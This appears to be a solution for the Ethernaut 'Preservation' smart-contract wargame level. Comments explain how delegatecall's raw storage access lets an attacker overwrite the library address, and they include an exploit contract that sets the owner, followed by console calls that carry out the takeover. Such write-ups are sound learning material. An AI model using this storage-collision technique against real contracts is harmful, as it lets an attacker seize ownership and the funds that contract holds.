
// the main issue with this example is that, when delegatecall is
// used, it's not that it accesses the contract storage members,
// it actually accesses the raw storage.
// this being the case, if the address to which the call is being delegated
// does not have the same storage structure as the caller, even if some member
// names are the same they will not point to the same storage location.
//
// since LibraryContract's first 32 bytes of storage are pointed by storedTime,
// the setTime delegatecall, when manipulating LibraryContract's storedTime, will
// actually be manipulating Preservation's timeZone1Library, since it points to
// Preservation's first 32 bytes of storage.
// thus, when calling setFirstTime or setSecondTime for the first time, we can change
// the value of timeZone1Library, which means we can use a setTime delegatecall to
// an arbitrary address.
// if that address can access the "owner" storage area, then it can edit Preservation's
// owner. the easiest way to achieve this is simply by copying the storage structure
// from Preservation until it:
//
// contract PreservationExploit {
//     address dummyAddress1;
//     address dummyAddress2;
//     address thisOwner;
//     
//     function setTime(uint256) public {
//         thisOwner = tx.origin;
//     }
// }


const contractAddr = "0x2CDdCbd2b8E31136F0fA02A281154Cf8bbF5e5b1";

await contract.setFirstTime(contractAddr);

await contract.timeZone1Library(); // "0x2CDdCbd2b8E31136F0fA02A281154Cf8bbF5e5b1"

await contract.setFirstTime(0);
